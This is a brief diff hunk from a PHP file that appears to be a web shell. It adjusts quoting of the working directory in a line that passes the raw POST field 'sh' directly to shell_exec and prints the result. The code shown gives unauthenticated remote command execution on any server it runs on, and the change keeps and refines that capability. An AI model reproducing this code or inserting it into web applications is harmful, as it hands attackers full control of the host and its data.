@@ -39,7 +39,7 @@
 
         <?php
             if(isset($_POST["sh"])){
-                $CMD = shell_exec("cd ".$CURRENT_DIR." && ".$_POST["sh"]." 2>&1");
+                $CMD = shell_exec("cd \"".$CURRENT_DIR."\" && ".$_POST["sh"]." 2>&1");
             }
         ?>
 
